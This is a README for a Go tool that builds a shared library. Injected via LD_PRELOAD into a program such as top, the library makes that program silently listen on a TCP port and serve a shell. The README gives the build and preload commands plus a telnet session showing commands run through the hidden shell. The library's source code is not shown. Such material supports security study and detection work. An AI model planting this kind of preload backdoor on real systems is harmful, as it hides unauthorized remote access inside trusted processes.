# Remote Shell

[![](https://goreportcard.com/badge/github.com/andygeiss/preload)](https://goreportcard.com/report/github.com/andygeiss/preload)

Open a remote shell in context of a dynamic binary by using a trampoline function like strrchr. 

## Repository structure

	.
	├── application
	│   └── remote
	│       ├── shell.go
	│       └── shell_test.go
	├── APPNAME
	├── build
	│   ├── remote-shell.h
	│   └── remote-shell.so
	├── business
	│   ├── handler
	│   │   └── handler.go
	│   ├── server
	│   │   └── server.go
	│   └── shell
	│       └── shell.go
	├── infrastructure
	│   └── tcp
	│       ├── handler.go
	│       └── server.go
	├── LICENSE
	├── Makefile
	├── platform
	│   └── remote-shell
	│       └── main.go
	└── README.md

## Build the shared library

    $ make

## Preload and run dynamic executables

Now open a remote shell via top by preloading the shared library:

    $ LD_PRELOAD=`pwd`/build/remote-shell.so top

## Verify

Finally verify the shell by using telnet:

	$ netstat -tulpen

	(Not all processes could be identified, non-owned process info
	will not be shown, you would have to be root to see it all.)
	Active Internet connections (only servers)
	Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
	tcp        0      0 127.0.0.1:54321         0.0.0.0:*               LISTEN      1000       1063479    4565/top            
	tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          14304      -                   

	$ telnet 127.0.0.1 54321

	Trying 127.0.0.1...
	Connected to 127.0.0.1.
	Escape character is '^]'.
	ps
	PID TTY          TIME CMD
	1346 pts/0    00:00:00 bash
	4967 pts/0    00:00:00 top
	4975 pts/0    00:00:00 sh
	4982 pts/0    00:00:00 ps
	whoami
	user
